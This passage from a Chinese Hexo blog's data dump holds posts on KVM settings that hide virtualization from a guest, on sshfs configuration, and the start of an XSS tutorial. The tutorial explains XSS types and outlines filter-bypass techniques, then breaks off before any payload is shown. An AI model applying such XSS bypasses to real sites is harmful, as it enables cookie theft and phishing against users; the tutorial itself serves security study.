class=\"hljs-string\">&#x27;host&#x27;</span>/&gt;</span><br>  ...<br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">os</span>&gt;</span><br>...<br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">features</span>&gt;</span><br>  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">hyperv</span>&gt;</span><br>    ...<br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">vendor_id</span> <span class=\"hljs-attr\">state</span>=<span class=\"hljs-string\">&#x27;on&#x27;</span> <span class=\"hljs-attr\">value</span>=<span class=\"hljs-string\">&#x27;123456789ab&#x27;</span>/&gt;</span><br>  <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">hyperv</span>&gt;</span><br>  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">kvm</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">hidden</span> <span class=\"hljs-attr\">state</span>=<span class=\"hljs-string\">&#x27;on&#x27;</span>/&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">hint-dedicated</span> <span class=\"hljs-attr\">state</span>=<span class=\"hljs-string\">&#x27;on&#x27;</span>/&gt;</span><br>  <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">kvm</span>&gt;</span><br>  ...<br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">features</span>&gt;</span><br>...<br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">cpu</span> <span class=\"hljs-attr\">mode</span>=<span class=\"hljs-string\">&#x27;host-passthrough&#x27;</span>&gt;</span><br>  ...<br>  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">feature</span> <span class=\"hljs-attr\">policy</span>=<span class=\"hljs-string\">&#x27;disable&#x27;</span> <span class=\"hljs-attr\">name</span>=<span class=\"hljs-string\">&#x27;hypervisor&#x27;</span>/&gt;</span><br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">cpu</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h2 id=\"4-2-黑屏-ucsi-cgg-1-0008-ucsi-handle-connector-change-GET-CONNECTOR-STATUS-failed\"><a href=\"#4-2-黑屏-ucsi-cgg-1-0008-ucsi-handle-connector-change-GET-CONNECTOR-STATUS-failed\" class=\"headerlink\" title=\"4.2 黑屏(ucsi_cgg 1-0008: ucsi_handle_connector_change: GET_CONNECTOR_STATUS failed)\"></a>4.2 黑屏(ucsi_cgg 1-0008: ucsi_handle_connector_change: GET_CONNECTOR_STATUS failed)</h2><ul>\n<li><code>ucsi_cgg</code> 为英伟达显卡的 <code>mod</code> 直接屏蔽就好</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">/etc/modprobe.d <span class=\"hljs-comment\"># cat blacklist-nvidia-usb.conf</span><br>blacklist ucsi_ccg<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"4-2-docker-桥接占用物理网卡导致网络不通的情况\"><a href=\"#4-2-docker-桥接占用物理网卡导致网络不通的情况\" class=\"headerlink\" title=\"4.2 docker 桥接占用物理网卡导致网络不通的情况\"></a>4.2 docker 桥接占用物理网卡导致网络不通的情况</h2><ul>\n<li>添加或修改 <code>/etc/docker/daemon.json</code> 将 kvm 的桥接网卡直接赋给 docker</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">&#123;<br>  <span class=\"hljs-string\">&quot;bridge&quot;</span>: <span class=\"hljs-string\">&quot;virbr&quot;</span>,<br>  <span class=\"hljs-string\">&quot;default-gateway&quot;</span>: <span class=\"hljs-string\">&quot;*.*.*.*&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure>\n"},{"title":"sshfs配置","excerpt":"sshfs sshfs client","index_img":"/img/article-head/sshfs.png","date":"2022-07-20T02:46:25.000Z","updated":"2022-07-20T02:46:25.000Z","hide":false,"_content":"\n- [1 server 端配置](#1-server-端配置)\n- [2 client 端](#2-client-端)\n  - [2.1 linux 挂载](#21-linux-挂载)\n  - [2.2 windows 挂载](#22-windows-挂载)\n\n# 1 server 端配置\n\n配置 `server` 端 `/etc/ssh/sshd_config` 文件\n\n```bash\nPermitRootLogin yes\nPubkeyAuthentication yes\nPasswordAuthentication no\n# 防止ssh超时断开连接，开启下列两项\nClientAliveInterval 120\nClientAliveCountMax 3\n```\n\n# 2 client 端\n\n## 2.1 linux 挂载\n\n```bash\nsudo sshfs 用户@ip:server端路径 client端挂载路径 -o reconnect -o cache=yes -o port=ssh端口号 -o users -o allow_other\n```\n\n## 2.2 windows 挂载\n\n安装以下工具：\n\n[sshfs-win](https://github.com/billziss-gh/sshfs-win/releases)\n[winfsp](https://github.com/billziss-gh/winfsp/releases)\n[SSHFS-Win Manager](https://github.com/evsar3/sshfs-win-manager/releases)\n\n配置文件位置 `C:\\Users\\用户\\AppData\\Roaming\\sshfs-win-manager\\vuex.json` \n\n```\n{\n\t\"state\": {\n\t\t\"Data\": {\n\t\t\t\"connections\": [\n\t\t\t\t{\n\t\t\t\t\t\"advanced\": {\n\t\t\t\t\t\t\"connectOnStartup\": false,\n\t\t\t\t\t\t\"customCmdlOptions\": [],\n\t\t\t\t\t\t\"customCmdlOptionsEnabled\": false,\n\t\t\t\t\t\t\"reconnect\": false\n\t\t\t\t\t},\n\t\t\t\t\t\"authType\": \"key-file\",\n\t\t\t\t\t\"folder\": \"/0.main\",\n\t\t\t\t\t\"host\": \"ip\",\n\t\t\t\t\t\"key\": \"\",\n\t\t\t\t\t\"keyFile\": \"C:\\\\Users\\\\用户\\\\.ssh\\\\id_rsa\",\n\t\t\t\t\t\"mountPoint\": \"A:\",\n\t\t\t\t\t\"name\": \"worisur\",\n\t\t\t\t\t\"password\": \"\",\n\t\t\t\t\t\"pid\": 4624,\n\t\t\t\t\t\"port\": 50011,\n\t\t\t\t\t\"preferredMountPoint\": null,\n\t\t\t\t\t\"status\": \"connected\",\n\t\t\t\t\t\"user\": \"用户\",\n\t\t\t\t\t\"uuid\": \"63308430-7dbf-4c8a-9fe5-a6c4bd28b595\"\n\t\t\t\t}\n\t\t\t]\n\t\t},\n\t\t\"Settings\": {\n\t\t\t\"settings\": {\n\t\t\t\t\"sshfsBinary\": \"C:\\\\Atools\\\\network\\\\sshfs\\\\sshfs-win\\\\bin\\\\sshfs.exe\",\n\t\t\t\t\"startupWithOS\": true,\n\t\t\t\t\"displayTrayMessageOnClose\": true,\n\t\t\t\t\"processTrackTimeout\": 15,\n\t\t\t\t\"showDebugPanel\": false\n\t\t\t}\n\t\t}\n\t}\n}\n```\n\n\n","source":"_posts/2022-07-20.sshfs.md","raw":"---\ntitle: sshfs配置\nexcerpt: sshfs sshfs client\nindex_img: /img/article-head/sshfs.png\ndate: \"2022/7/20 10:46:25\"\nupdated: \"2022/7/20 10:46:25\"\nhide: false\ntags:\n- ssh\n- sshfs\ncategories:\n- ssh\n- sshfs\n---\n\n- [1 server 端配置](#1-server-端配置)\n- [2 client 端](#2-client-端)\n  - [2.1 linux 挂载](#21-linux-挂载)\n  - [2.2 windows 挂载](#22-windows-挂载)\n\n# 1 server 端配置\n\n配置 `server` 端 `/etc/ssh/sshd_config` 文件\n\n```bash\nPermitRootLogin yes\nPubkeyAuthentication yes\nPasswordAuthentication no\n# 防止ssh超时断开连接，开启下列两项\nClientAliveInterval 120\nClientAliveCountMax 3\n```\n\n# 2 client 端\n\n## 2.1 linux 挂载\n\n```bash\nsudo sshfs 用户@ip:server端路径 client端挂载路径 -o reconnect -o cache=yes -o port=ssh端口号 -o users -o allow_other\n```\n\n## 2.2 windows 挂载\n\n安装以下工具：\n\n[sshfs-win](https://github.com/billziss-gh/sshfs-win/releases)\n[winfsp](https://github.com/billziss-gh/winfsp/releases)\n[SSHFS-Win Manager](https://github.com/evsar3/sshfs-win-manager/releases)\n\n配置文件位置 `C:\\Users\\用户\\AppData\\Roaming\\sshfs-win-manager\\vuex.json` \n\n```\n{\n\t\"state\": {\n\t\t\"Data\": {\n\t\t\t\"connections\": [\n\t\t\t\t{\n\t\t\t\t\t\"advanced\": {\n\t\t\t\t\t\t\"connectOnStartup\": false,\n\t\t\t\t\t\t\"customCmdlOptions\": [],\n\t\t\t\t\t\t\"customCmdlOptionsEnabled\": false,\n\t\t\t\t\t\t\"reconnect\": false\n\t\t\t\t\t},\n\t\t\t\t\t\"authType\": \"key-file\",\n\t\t\t\t\t\"folder\": \"/0.main\",\n\t\t\t\t\t\"host\": \"ip\",\n\t\t\t\t\t\"key\": \"\",\n\t\t\t\t\t\"keyFile\": \"C:\\\\Users\\\\用户\\\\.ssh\\\\id_rsa\",\n\t\t\t\t\t\"mountPoint\": \"A:\",\n\t\t\t\t\t\"name\": \"worisur\",\n\t\t\t\t\t\"password\": \"\",\n\t\t\t\t\t\"pid\": 4624,\n\t\t\t\t\t\"port\": 50011,\n\t\t\t\t\t\"preferredMountPoint\": null,\n\t\t\t\t\t\"status\": \"connected\",\n\t\t\t\t\t\"user\": \"用户\",\n\t\t\t\t\t\"uuid\": \"63308430-7dbf-4c8a-9fe5-a6c4bd28b595\"\n\t\t\t\t}\n\t\t\t]\n\t\t},\n\t\t\"Settings\": {\n\t\t\t\"settings\": {\n\t\t\t\t\"sshfsBinary\": \"C:\\\\Atools\\\\network\\\\sshfs\\\\sshfs-win\\\\bin\\\\sshfs.exe\",\n\t\t\t\t\"startupWithOS\": true,\n\t\t\t\t\"displayTrayMessageOnClose\": true,\n\t\t\t\t\"processTrackTimeout\": 15,\n\t\t\t\t\"showDebugPanel\": false\n\t\t\t}\n\t\t}\n\t}\n}\n```\n\n\n","slug":"2022-07-20.sshfs","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"cl6nug9b2000coqna4o711odh","content":"<ul>\n<li><a href=\"#1-server-%E7%AB%AF%E9%85%8D%E7%BD%AE\">1 server 端配置</a></li>\n<li><a href=\"#2-client-%E7%AB%AF\">2 client 端</a><ul>\n<li><a href=\"#21-linux-%E6%8C%82%E8%BD%BD\">2.1 linux 挂载</a></li>\n<li><a href=\"#22-windows-%E6%8C%82%E8%BD%BD\">2.2 windows 挂载</a></li>\n</ul>\n</li>\n</ul>\n<h1 id=\"1-server-端配置\"><a href=\"#1-server-端配置\" class=\"headerlink\" title=\"1 server 端配置\"></a>1 server 端配置</h1><p>配置 <code>server</code> 端 <code>/etc/ssh/sshd_config</code> 文件</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">PermitRootLogin <span class=\"hljs-built_in\">yes</span><br>PubkeyAuthentication <span class=\"hljs-built_in\">yes</span><br>PasswordAuthentication no<br><span class=\"hljs-comment\"># 防止ssh超时断开连接，开启下列两项</span><br>ClientAliveInterval 120<br>ClientAliveCountMax 3<br></code></pre></td></tr></table></figure>\n\n<h1 id=\"2-client-端\"><a href=\"#2-client-端\" class=\"headerlink\" title=\"2 client 端\"></a>2 client 端</h1><h2 id=\"2-1-linux-挂载\"><a href=\"#2-1-linux-挂载\" class=\"headerlink\" title=\"2.1 linux 挂载\"></a>2.1 linux 挂载</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">sudo sshfs 用户@ip:server端路径 client端挂载路径 -o reconnect -o cache=<span class=\"hljs-built_in\">yes</span> -o port=ssh端口号 -o <span class=\"hljs-built_in\">users</span> -o allow_other<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"2-2-windows-挂载\"><a href=\"#2-2-windows-挂载\" class=\"headerlink\" title=\"2.2 windows 挂载\"></a>2.2 windows 挂载</h2><p>安装以下工具：</p>\n<p><a href=\"https://github.com/billziss-gh/sshfs-win/releases\">sshfs-win</a><br><a href=\"https://github.com/billziss-gh/winfsp/releases\">winfsp</a><br><a href=\"https://github.com/evsar3/sshfs-win-manager/releases\">SSHFS-Win Manager</a></p>\n<p>配置文件位置 <code>C:\\Users\\用户\\AppData\\Roaming\\sshfs-win-manager\\vuex.json</code> </p>\n<figure class=\"highlight wren\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs wren\">&#123;<br>\t<span class=\"hljs-string\">&quot;state&quot;</span>: &#123;<br>\t\t<span class=\"hljs-string\">&quot;Data&quot;</span>: &#123;<br>\t\t\t<span class=\"hljs-string\">&quot;connections&quot;</span>: [<br>\t\t\t\t&#123;<br>\t\t\t\t\t<span class=\"hljs-string\">&quot;advanced&quot;</span>: &#123;<br>\t\t\t\t\t\t<span class=\"hljs-string\">&quot;connectOnStartup&quot;</span>: <span class=\"hljs-literal\">false</span>,<br>\t\t\t\t\t\t<span class=\"hljs-string\">&quot;customCmdlOptions&quot;</span>: [],<br>\t\t\t\t\t\t<span class=\"hljs-string\">&quot;customCmdlOptionsEnabled&quot;</span>: <span class=\"hljs-literal\">false</span>,<br>\t\t\t\t\t\t<span class=\"hljs-string\">&quot;reconnect&quot;</span>: <span class=\"hljs-literal\">false</span><br>\t\t\t\t\t&#125;,<br>\t\t\t\t\t<span class=\"hljs-string\">&quot;authType&quot;</span>: <span class=\"hljs-string\">&quot;key-file&quot;</span>,<br>\t\t\t\t\t<span class=\"hljs-string\">&quot;folder&quot;</span>: <span class=\"hljs-string\">&quot;/0.main&quot;</span>,<br>\t\t\t\t\t<span class=\"hljs-string\">&quot;host&quot;</span>: <span class=\"hljs-string\">&quot;ip&quot;</span>,<br>\t\t\t\t\t<span class=\"hljs-string\">&quot;key&quot;</span>: <span class=\"hljs-string\">&quot;&quot;</span>,<br>\t\t\t\t\t<span class=\"hljs-string\">&quot;keyFile&quot;</span>: <span class=\"hljs-string\">&quot;C:<span class=\"hljs-char escape_\">\\\\</span>Users<span class=\"hljs-char escape_\">\\\\</span>用户<span class=\"hljs-char escape_\">\\\\</span>.ssh<span class=\"hljs-char escape_\">\\\\</span>id_rsa&quot;</span>,<br>\t\t\t\t\t<span class=\"hljs-string\">&quot;mountPoint&quot;</span>: <span class=\"hljs-string\">&quot;A:&quot;</span>,<br>\t\t\t\t\t<span class=\"hljs-string\">&quot;name&quot;</span>: <span class=\"hljs-string\">&quot;worisur&quot;</span>,<br>\t\t\t\t\t<span class=\"hljs-string\">&quot;password&quot;</span>: <span class=\"hljs-string\">&quot;&quot;</span>,<br>\t\t\t\t\t<span class=\"hljs-string\">&quot;pid&quot;</span>: <span class=\"hljs-number\">4624</span>,<br>\t\t\t\t\t<span class=\"hljs-string\">&quot;port&quot;</span>: <span class=\"hljs-number\">50011</span>,<br>\t\t\t\t\t<span class=\"hljs-string\">&quot;preferredMountPoint&quot;</span>: <span class=\"hljs-literal\">null</span>,<br>\t\t\t\t\t<span class=\"hljs-string\">&quot;status&quot;</span>: <span class=\"hljs-string\">&quot;connected&quot;</span>,<br>\t\t\t\t\t<span class=\"hljs-string\">&quot;user&quot;</span>: <span class=\"hljs-string\">&quot;用户&quot;</span>,<br>\t\t\t\t\t<span class=\"hljs-string\">&quot;uuid&quot;</span>: <span class=\"hljs-string\">&quot;63308430-7dbf-4c8a-9fe5-a6c4bd28b595&quot;</span><br>\t\t\t\t&#125;<br>\t\t\t]<br>\t\t&#125;,<br>\t\t<span class=\"hljs-string\">&quot;Settings&quot;</span>: &#123;<br>\t\t\t<span class=\"hljs-string\">&quot;settings&quot;</span>: &#123;<br>\t\t\t\t<span class=\"hljs-string\">&quot;sshfsBinary&quot;</span>: <span class=\"hljs-string\">&quot;C:<span class=\"hljs-char escape_\">\\\\</span>Atools<span class=\"hljs-char escape_\">\\\\</span>network<span class=\"hljs-char escape_\">\\\\</span>sshfs<span class=\"hljs-char escape_\">\\\\</span>sshfs-win<span class=\"hljs-char escape_\">\\\\</span>bin<span class=\"hljs-char escape_\">\\\\</span>sshfs.exe&quot;</span>,<br>\t\t\t\t<span class=\"hljs-string\">&quot;startupWithOS&quot;</span>: <span class=\"hljs-literal\">true</span>,<br>\t\t\t\t<span class=\"hljs-string\">&quot;displayTrayMessageOnClose&quot;</span>: <span class=\"hljs-literal\">true</span>,<br>\t\t\t\t<span class=\"hljs-string\">&quot;processTrackTimeout&quot;</span>: <span class=\"hljs-number\">15</span>,<br>\t\t\t\t<span class=\"hljs-string\">&quot;showDebugPanel&quot;</span>: <span class=\"hljs-literal\">false</span><br>\t\t\t&#125;<br>\t\t&#125;<br>\t&#125;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n\n","site":{"data":{}},"wordcount":1611,"more":"<ul>\n<li><a href=\"#1-server-%E7%AB%AF%E9%85%8D%E7%BD%AE\">1 server 端配置</a></li>\n<li><a href=\"#2-client-%E7%AB%AF\">2 client 端</a><ul>\n<li><a href=\"#21-linux-%E6%8C%82%E8%BD%BD\">2.1 linux 挂载</a></li>\n<li><a href=\"#22-windows-%E6%8C%82%E8%BD%BD\">2.2 windows 挂载</a></li>\n</ul>\n</li>\n</ul>\n<h1 id=\"1-server-端配置\"><a href=\"#1-server-端配置\" class=\"headerlink\" title=\"1 server 端配置\"></a>1 server 端配置</h1><p>配置 <code>server</code> 端 <code>/etc/ssh/sshd_config</code> 文件</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">PermitRootLogin <span class=\"hljs-built_in\">yes</span><br>PubkeyAuthentication <span class=\"hljs-built_in\">yes</span><br>PasswordAuthentication no<br><span class=\"hljs-comment\"># 防止ssh超时断开连接，开启下列两项</span><br>ClientAliveInterval 120<br>ClientAliveCountMax 3<br></code></pre></td></tr></table></figure>\n\n<h1 id=\"2-client-端\"><a href=\"#2-client-端\" class=\"headerlink\" title=\"2 client 端\"></a>2 client 端</h1><h2 id=\"2-1-linux-挂载\"><a href=\"#2-1-linux-挂载\" class=\"headerlink\" title=\"2.1 linux 挂载\"></a>2.1 linux 挂载</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs bash\">sudo sshfs 用户@ip:server端路径 client端挂载路径 -o reconnect -o cache=<span class=\"hljs-built_in\">yes</span> -o port=ssh端口号 -o <span class=\"hljs-built_in\">users</span> -o allow_other<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"2-2-windows-挂载\"><a href=\"#2-2-windows-挂载\" class=\"headerlink\" title=\"2.2 windows 挂载\"></a>2.2 windows 挂载</h2><p>安装以下工具：</p>\n<p><a href=\"https://github.com/billziss-gh/sshfs-win/releases\">sshfs-win</a><br><a href=\"https://github.com/billziss-gh/winfsp/releases\">winfsp</a><br><a href=\"https://github.com/evsar3/sshfs-win-manager/releases\">SSHFS-Win Manager</a></p>\n<p>配置文件位置 <code>C:\\Users\\用户\\AppData\\Roaming\\sshfs-win-manager\\vuex.json</code> </p>\n<figure class=\"highlight wren\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs wren\">&#123;<br>\t<span class=\"hljs-string\">&quot;state&quot;</span>: &#123;<br>\t\t<span class=\"hljs-string\">&quot;Data&quot;</span>: &#123;<br>\t\t\t<span class=\"hljs-string\">&quot;connections&quot;</span>: [<br>\t\t\t\t&#123;<br>\t\t\t\t\t<span class=\"hljs-string\">&quot;advanced&quot;</span>: &#123;<br>\t\t\t\t\t\t<span class=\"hljs-string\">&quot;connectOnStartup&quot;</span>: <span class=\"hljs-literal\">false</span>,<br>\t\t\t\t\t\t<span class=\"hljs-string\">&quot;customCmdlOptions&quot;</span>: [],<br>\t\t\t\t\t\t<span class=\"hljs-string\">&quot;customCmdlOptionsEnabled&quot;</span>: <span class=\"hljs-literal\">false</span>,<br>\t\t\t\t\t\t<span class=\"hljs-string\">&quot;reconnect&quot;</span>: <span class=\"hljs-literal\">false</span><br>\t\t\t\t\t&#125;,<br>\t\t\t\t\t<span class=\"hljs-string\">&quot;authType&quot;</span>: <span class=\"hljs-string\">&quot;key-file&quot;</span>,<br>\t\t\t\t\t<span class=\"hljs-string\">&quot;folder&quot;</span>: <span class=\"hljs-string\">&quot;/0.main&quot;</span>,<br>\t\t\t\t\t<span class=\"hljs-string\">&quot;host&quot;</span>: <span class=\"hljs-string\">&quot;ip&quot;</span>,<br>\t\t\t\t\t<span class=\"hljs-string\">&quot;key&quot;</span>: <span class=\"hljs-string\">&quot;&quot;</span>,<br>\t\t\t\t\t<span class=\"hljs-string\">&quot;keyFile&quot;</span>: <span class=\"hljs-string\">&quot;C:<span class=\"hljs-char escape_\">\\\\</span>Users<span class=\"hljs-char escape_\">\\\\</span>用户<span class=\"hljs-char escape_\">\\\\</span>.ssh<span class=\"hljs-char escape_\">\\\\</span>id_rsa&quot;</span>,<br>\t\t\t\t\t<span class=\"hljs-string\">&quot;mountPoint&quot;</span>: <span class=\"hljs-string\">&quot;A:&quot;</span>,<br>\t\t\t\t\t<span class=\"hljs-string\">&quot;name&quot;</span>: <span class=\"hljs-string\">&quot;worisur&quot;</span>,<br>\t\t\t\t\t<span class=\"hljs-string\">&quot;password&quot;</span>: <span class=\"hljs-string\">&quot;&quot;</span>,<br>\t\t\t\t\t<span class=\"hljs-string\">&quot;pid&quot;</span>: <span class=\"hljs-number\">4624</span>,<br>\t\t\t\t\t<span class=\"hljs-string\">&quot;port&quot;</span>: <span class=\"hljs-number\">50011</span>,<br>\t\t\t\t\t<span class=\"hljs-string\">&quot;preferredMountPoint&quot;</span>: <span class=\"hljs-literal\">null</span>,<br>\t\t\t\t\t<span class=\"hljs-string\">&quot;status&quot;</span>: <span class=\"hljs-string\">&quot;connected&quot;</span>,<br>\t\t\t\t\t<span class=\"hljs-string\">&quot;user&quot;</span>: <span class=\"hljs-string\">&quot;用户&quot;</span>,<br>\t\t\t\t\t<span class=\"hljs-string\">&quot;uuid&quot;</span>: <span class=\"hljs-string\">&quot;63308430-7dbf-4c8a-9fe5-a6c4bd28b595&quot;</span><br>\t\t\t\t&#125;<br>\t\t\t]<br>\t\t&#125;,<br>\t\t<span class=\"hljs-string\">&quot;Settings&quot;</span>: &#123;<br>\t\t\t<span class=\"hljs-string\">&quot;settings&quot;</span>: &#123;<br>\t\t\t\t<span class=\"hljs-string\">&quot;sshfsBinary&quot;</span>: <span class=\"hljs-string\">&quot;C:<span class=\"hljs-char escape_\">\\\\</span>Atools<span class=\"hljs-char escape_\">\\\\</span>network<span class=\"hljs-char escape_\">\\\\</span>sshfs<span class=\"hljs-char escape_\">\\\\</span>sshfs-win<span class=\"hljs-char escape_\">\\\\</span>bin<span class=\"hljs-char escape_\">\\\\</span>sshfs.exe&quot;</span>,<br>\t\t\t\t<span class=\"hljs-string\">&quot;startupWithOS&quot;</span>: <span class=\"hljs-literal\">true</span>,<br>\t\t\t\t<span class=\"hljs-string\">&quot;displayTrayMessageOnClose&quot;</span>: <span class=\"hljs-literal\">true</span>,<br>\t\t\t\t<span class=\"hljs-string\">&quot;processTrackTimeout&quot;</span>: <span class=\"hljs-number\">15</span>,<br>\t\t\t\t<span class=\"hljs-string\">&quot;showDebugPanel&quot;</span>: <span class=\"hljs-literal\">false</span><br>\t\t\t&#125;<br>\t\t&#125;<br>\t&#125;<br>&#125;<br></code></pre></td></tr></table></figure>\n\n\n"},{"title":"经典漏洞-XSS","excerpt":"XSS原理、XSS编码……","index_img":"/img/article-head/XSS.png","date":"2022-07-21T08:46:25.000Z","updated":"2022-08-04T04:30:25.000Z","hide":false,"_content":"\n- [1 XSS 概述和原理](#1-xss-概述和原理)\n- [1.1 XSS 类型](#11-xss-类型)\n- [2 XSS 载荷与插入位置](#2-xss-载荷与插入位置)\n  - [2.1 载荷](#21-载荷)\n    - [2.1.1 script 标签](#211-script-标签)\n    - [2.1.2 svg 标签](#212-svg-标签)\n    - [2.1.3 img 标签](#213-img-标签)\n    - [2.1.4 body 标签](#214-body-标签)\n    - [2.1.5 video 标签](#215-video-标签)\n    - [2.1.6 style 标签](#216-style-标签)\n    - [2.1.7 details](#217-details)\n    - [2.1.8 select](#218-select)\n    - [2.1.9 iframe](#219-iframe)\n    - [2.1.10 form](#2110-form)\n    - [2.1.11 自定义标签](#2111-自定义标签)\n  - [2.2 XSS 可以插入的位置](#22-xss-可以插入的位置)\n    - [2.2.1 测试位置](#221-测试位置)\n- [3 XSS 编码与绕过](#3-xss-编码与绕过)\n  - [3.1 网页的解码过程](#31-网页的解码过程)\n  - [3.2 绕过](#32-绕过)\n    - [3.2.1 关键字被过滤](#321-关键字被过滤)\n      - [3.2.1.1 双写绕过](#3211-双写绕过)\n      - [3.2.1.2 字符拼接](#3212-字符拼接)\n      - [3.2.1.3 编码绕过](#3213-编码绕过)\n      - [3.2.1.4 内嵌编码后TAB](#3214-内嵌编码后tab)\n      - [3.2.1.5 多重尖括号](#3215-多重尖括号)\n      - [3.2.1.6 将JS文件重命名为图像](#3216-将js文件重命名为图像)\n    - [3.2.2 过滤空格/引号](#322-过滤空格引号)\n      - [3.2.2.1 使用/代替](#3221-使用代替)\n    - [3.2.3 过滤单/双引号](#323-过滤单双引号)\n    - [3.2.4 过滤括号](#324-过滤括号)\n    - [3.2.5 过滤URL地址](#325-过滤url地址)\n- [4 利用](#4-利用)\n  - [参考文章](#参考文章)\n\n# 1 XSS 概述和原理\n\n跨站脚本攻击是一种常见的web安全漏洞，它主要是指攻击者可以在页面中插入恶意脚本代码，当受害者访问这些页面时，浏览器会解析并执行这些恶意代码，从而达到窃取用户身份/钓鱼/传播恶意代码等行为。  \n\nHTML是一种超文本标记语言，通过将一些字符特殊地对待来区别文本和标记，例如，小于符号 < 被看作是HTML标签的开始，之间的字符是页面的标题等等。当动态页面中插入的内容含有这些特殊字符（如<）时，用户浏览器会将其误认为是插入了HTML标签，当这些HTML标签引入了一段JavaScript脚本时，这些脚本程序就将会在用户浏览器中执行。所以，当这些特殊字符不能被动态页面检查或检查出现失误时，就将会产生XSS漏洞。\n\n# 1.1 XSS 类型\n\n- 存储型XSS\n \n存储型XSS，持久化，代码是存储在服务器中的，如在个人信息或发表文章等地方，插入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候触发代码执行。这种XSS比较危险，容易造成蠕虫，盗窃 cookie\n\n![存储型xss](/img/article/XSS/存储型xss.png)\n\n- 反射型XSS\n\n非持久化，需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。反射型XSS大多数是用来盗取用户的Cookie信息。\n\n![反射型xss](/img/article/XSS/反射型xss.png)\n\n- DOM型XSS\n\n不经过后端，DOM-XSS漏洞是基于文档对象模型（Document Objeet Model，DOM）的一种漏洞，DOM—XSS是通过url传入参数去控制触发的，其实也属于反射型XSS。DOM的详解：DOM文档对象模型  \n> 可能触发DOM型XSS的属性：document.referer window.name location innerHTML documen.write \n\n# 2 XSS 载荷与插入位置\n\n## 2.1 载荷\n\n> tip: 所有的闭合标签的 `>` 都可以用 `//` 代替 \n\n### 2.1.1 script 